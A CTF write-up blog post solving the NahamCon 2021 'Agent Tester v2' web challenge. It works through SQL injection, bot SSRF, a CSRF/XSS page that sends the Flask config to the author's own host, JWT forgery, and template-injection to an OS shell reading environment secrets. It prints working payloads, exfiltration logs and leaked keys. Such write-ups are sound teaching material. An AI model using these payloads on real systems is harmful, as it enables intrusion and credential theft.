---
layout: post
title: NahamCon CTF 2021 - Agent Tester v2 [web]
author: lanjelot
tags: [ctf, NahamCon CTF, web]
---

 * Competition: [NahamCon CTF 2021](https://ctftime.org/event/1281)
 * Challenge Name: Agent Tester v2
 * Type: Web
 * Points: 500 pts
 * Description: 
 > The new developer we hired did a bad job and we got pwned. We hired someone else to fix the issue.
 > https://ctf.nahamcon.com/files/354c72ad810a5c9e05c55bc3c6cb6e35/agenttesterV2.zip
 > Author: @jorgectf#3896

The challenge
=============

tl;dr: union SQLi via websocket to SSRF bot to my own site hosting a CSRF to make bot update its profile with a PXSS in the `about` field which exploits a Jinja2 SSTI to exfil the Flask config back to my own server, then forge admin JWT using `SECRET_KEY` and gain RCE through the SSTI.

Surprisingly my solution was unintended, see the author's [write up](https://github.com/jorgectf/Created-CTF-Challenges/tree/main/challenges/AgentTester%20@%20NahamConCTF%202021) for the intended solution.

<!--more-->

The first version of `AgentTester` had an unintended solution so the author released a second version where we could no longer retrieve the admin plain password via the union SQLi.

Route `/req` is vuln to sqli via websocket. Make bot visit our site via union query.
```
-> To Server: x' union select 'Woot','http://me.com/
<- To Client: Testing User-Agent: Woot in url: http://me.com/
```

I used the below `index.html` to CSRF the bot. The response to the `POST /profile/1` request then includes the XSS which exfils the Flask config via the `/debug` endpoint.
```html
<!DOCTYPE html>
<html>
<head><meta http-equiv="content-type" content="text/html; charset=utf-8"></head>
<body>
<body onload="window.blah.submit()">
  <form id="blah" method="POST" action="http://challenge.nahamcon.com:30556/profile/1" >
    <input id="whatevs" name="about" value='">&lt;script>var x=new XMLHttpRequest();x.onload=()=>{location="http://me.com/?"&#x2b;btoa(x.responseText);};x.open("post","http://challenge.nahamcon.com:30556/debug",false);x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");x.send("code={{config}}");&lt;/script>'>
  </form>
</body>
</html>
```

```
-- 35.223.208.106 [2021-03-15 00:17:07,513]
GET /?Jmx0O0NvbmZpZyB7JiMzOTtFTlYmIzM5OzogJiMzOTtwcm9kdWN0aW9uJiMzOTssICYjMzk7REVCVUcmIzM5OzogRmFsc2UsICYjMzk7VEVTVElORyYjMzk7OiBGYWxzZSwgJiMzOTtQUk9QQUdBVEVfRVhDRVBUSU9OUyYjMzk7OiBOb25lLCAmIzM5O1BSRVNFUlZFX0NPTlRFWFRfT05fRVhDRVBUSU9OJiMzOTs6IE5vbmUsICYjMzk7U0VDUkVUX0tFWSYjMzk7OiAmIzM5OzFMNSZhbXA7d3FYTStrejVuSWg0IVJ6NlVmb15pWT9hUnlWMiYjMzk7LCAmIzM5O1BFUk1BTkVOVF9TRVNTSU9OX0xJRkVUSU1FJiMzOTs6IGRhdGV0aW1lLnRpbWVkZWx0YShkYXlzPTMxKSwgJiMzOTtVU0VfWF9TRU5ERklMRSYjMzk7OiBGYWxzZSwgJiMzOTtTRVJWRVJfTkFNRSYjMzk7OiBOb25lLCAmIzM5O0FQUExJQ0FUSU9OX1JPT1QmIzM5OzogJiMzOTsvJiMzOTssICYjMzk7U0VTU0lPTl9DT09LSUVfTkFNRSYjMzk7OiAmIzM5O2F1dGgyJiMzOTssICYjMzk7U0VTU0lPTl9DT09LSUVfRE9NQUlOJiMzOTs6IEZhbHNlLCAmIzM5O1NFU1NJT05fQ09PS0lFX1BBVEgmIzM5OzogTm9uZSwgJiMzOTtTRVNTSU9OX0NPT0tJRV9IVFRQT05MWSYjMzk7OiBUcnVlLCAmIzM5O1NFU1NJT05fQ09PS0lFX1NFQ1VSRSYjMzk7OiBGYWxzZSwgJiMzOTtTRVNTSU9OX0NPT0tJRV9TQU1FU0lURSYjMzk7OiBOb25lLCAmIzM5O1NFU1NJT05fUkVGUkVTSF9FQUNIX1JFUVVFU1QmIzM5OzogVHJ1ZSwgJiMzOTtNQVhfQ09OVEVOVF9MRU5HVEgmIzM5OzogTm9uZSwgJiMzOTtTRU5EX0ZJTEVfTUFYX0FHRV9ERUZBVUxUJiMzOTs6IGRhdGV0aW1lLnRpbWVkZWx0YShzZWNvbmRzPTQzMjAwKSwgJiMzOTtUUkFQX0JBRF9SRVFVRVNUX0VSUk9SUyYjMzk7OiBOb25lLCAmIzM5O1RSQVBfSFRUUF9FWENFUFRJT05TJiMzOTs6IEZhbHNlLCAmIzM5O0VYUExBSU5fVEVNUExBVEVfTE9BRElORyYjMzk7OiBGYWxzZSwgJiMzOTtQUkVGRVJSRURfVVJMX1NDSEVNRSYjMzk7OiAmIzM5O2h0dHAmIzM5OywgJiMzOTtKU09OX0FTX0FTQ0lJJiMzOTs6IFRydWUsICYjMzk7SlNPTl9TT1JUX0tFWVMmIzM5OzogVHJ1ZSwgJiMzOTtKU09OSUZZX1BSRVRUWVBSSU5UX1JFR1VMQVImIzM5OzogRmFsc2UsICYjMzk7SlNPTklGWV9NSU1FVFlQRSYjMzk7OiAmIzM5O2FwcGxpY2F0aW9uL2pzb24mIzM5OywgJiMzOTtURU1QTEFURVNfQVVUT19SRUxPQUQmIzM5OzogTm9uZSwgJiMzOTtNQVhfQ09PS0lFX1NJWkUmIzM5OzogNDA5MywgJiMzOTtTUUxBTENIRU1ZX0RBVEFCQVNFX1VSSSYjMzk7OiAmIzM5O3NxbGl0ZTovLy9EQi9kYi5zcWxpdGUmIzM5OywgJiMzOTtTUUxBTENIRU1ZX1RSQUNLX01PRElGSUNBVElPTlMmIzM5OzogRmFsc2UsICYjMzk7U1FMQUxDSEVNWV9CSU5EUyYjMzk7OiBOb25lLCAmIzM5O1NRTEFMQ0hFTVlfTkFUSVZFX1VOSUNPREUmIzM5OzogTm9uZSwgJiMzOTtTUUxBTENIRU1ZX0VDSE8mIzM5OzogRmFsc2UsICYjMzk7U1FMQUxDSEVNWV9SRUNPUkRfUVVFUklFUyYjMzk7OiBOb25lLCAmIzM5O1NRTEFMQ0hFTVlfUE9PTF9TSVpFJiMzOTs6IE5vbmUsICYjMzk7U1FMQUxDSEVNWV9QT09MX1RJTUVPVVQmIzM5OzogTm9uZSwgJiMzOTtTUUxBTENIRU1ZX1BPT0xfUkVDWUNMRSYjMzk7OiBOb25lLCAmIzM5O1NRTEFMQ0hFTVlfTUFYX09WRVJGTE9XJiMzOTs6IE5vbmUsICYjMzk7U1FMQUxDSEVNWV9DT01NSVRfT05fVEVBUkRPV04mIzM5OzogRmFsc2UsICYjMzk7U1FMQUxDSEVNWV9FTkdJTkVfT1BUSU9OUyYjMzk7OiB7fX0mZ3Q7 HTTP/1.1
Host: me.com
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Woot
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://challenge.nahamcon.com:30556/
Accept-Encoding: gzip, deflate
Accept-Language: en-US
```

Decode the Flask config.
```
<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '1L5&wqXM+kz5nIh4!Rz6Ufo^iY?aRyV2', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'auth2', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///DB/db.sqlite', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
```

Forge the admin JWT cookie using the compromised `SECRET_KEY` and run [tplmap](https://github.com/epinna/tplmap) to automagically exploit the SSTI.
```
$ ./tplmap.py -c 'auth2=eyJpZCI6MX0.YE4ONg.iq1D9O_mtrGWXdQHdrhNtSHPKPI' -u http://challenge.nahamcon.com:30556/debug -d 'code=*' --os-shell
[+] Tplmap 0.5
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if POST parameter 'code' is injectable
[+] Smarty plugin is testing rendering with tag '*'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
[+] Mako plugin is testing blind injection
[+] Python plugin is testing rendering with tag 'str(*)'
[+] Python plugin is testing blind injection
[+] Tornado plugin is testing rendering with tag '{{*}}'
[+] Tornado plugin is testing blind injection
[+] Jinja2 plugin is testing rendering with tag '{{*}}'
[+] Jinja2 plugin has confirmed injection with tag '{{*}}'
[+] Tplmap identified the following injection point:

  POST parameter: code
  Engine: Jinja2
  Injection: {{*}}
  Context: text
  OS: posix-linux
  Technique: render
  Capabilities:

   Shell command execution: ok
   Bind and reverse shell: ok
   File write: ok
   File read: ok
   Code evaluation: ok, python code

[+] Run commands on the operating system.
posix-linux $ ls /
app
bin
boot
data
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
posix-linux $ cat /proc/self/environ
BASE_URL=challenge.nahamcon.com
KUBERNETES_SERVICE_PORT=443
KUBERNETES_PORT=tcp://10.116.0.1:443
UWSGI_ORIGINAL_PROC_NAME=uwsgi
HOSTNAME=agenttester-v-a0776b679d08d42c-df8575c6c-lm6hq
SHLVL=1
PYTHON_PIP_VERSION=21.0.1
PORT=30556
HOME=/root
GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568
_=/usr/local/bin/uwsgi
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/b60e2320d9e8d02348525bd74e871e466afdf77c/get-pip.py
KUBERNETES_PORT_443_TCP_ADDR=10.116.0.1P
ATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
KUBERNETES_PORT_443_TCP_PORT=443
KUBERNETES_PORT_443_TCP_PROTO=tcp
LANG=C.UTF-8
CHALLENGE_FLAG=flag{6daf77ca9478a1be670acd4547f4976a}
PYTHON_VERSION=3.8.8
ADMIN_BOT_PASSWORD=jpqX7mvBiwqljOwQgC97c6nxTgVjKxE9
KUBERNETES_SERVICE_PORT_HTTPS=443
KUBERNETES_PORT_443_TCP=tcp://10.116.0.1:443
CHALLENGE_NAME=AgentTester
PWD=/app
ADMIN_BOT_USER=admin
KUBERNETES_SERVICE_HOST=10.116.0.1
PYTHON_GET_PIP_SHA256=c3b81e5d06371e135fb3156dc7d8fd6270735088428c4a9a5ec1f342e2024565
UWSGI_RELOADS=0
posix-linux $
```

Flag: `CHALLENGE_FLAG=flag{6daf77ca9478a1be670acd4547f4976a}`

Alternative solutions AFAIK:
* CSRF bot to directly POST to `/debug` to get a reverse shell see [this poc](https://discord.com/channels/598608711186907146/820748103657193472/820756728055726142) by `@BronyUraj#6953`
* XSS can be simplified to just exfil the flag using `code={{environ}}` because of this line `app.jinja_env.globals.update(environ=os.environ.get)` in `app/backend/backend.py`
* Use another challenge on the `challenge.nahamcon.com` domain to host a PHP script and SSRF puppeteer via union sqli to net the `auth2` admin cookie. This works because the puppeteer cookie is set with `domain: challenge.nahamcon.com` in `app/browser/browser.js` 

